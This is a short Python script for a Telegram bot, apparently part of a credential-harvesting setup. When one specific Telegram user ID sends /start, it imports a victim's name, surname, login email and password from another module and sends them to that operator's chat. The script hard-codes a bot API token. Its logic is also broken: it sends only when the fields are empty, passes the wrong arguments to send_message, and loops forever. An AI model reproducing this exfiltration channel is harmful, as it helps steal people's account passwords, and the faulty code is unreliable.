from telebot import telebot


bot = telebot.TeleBot('5226540618:AAFaTMrlXWuE2tJH64EjMvEANJ_AnBIHAJY')

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if message.from_user.id == 872676616:
        while True:
            from main import user, second_name,email,passwd
            if user == '' or second_name == '' or email == '' or passwd == '':
                bot.send_message(message.chat.id, 'Имя: ', user, '\n Фамилия: ', second_name, '\nЛогин: ', email, '\nПароль: ', passwd)

bot.polling(none_stop=True, interval=0)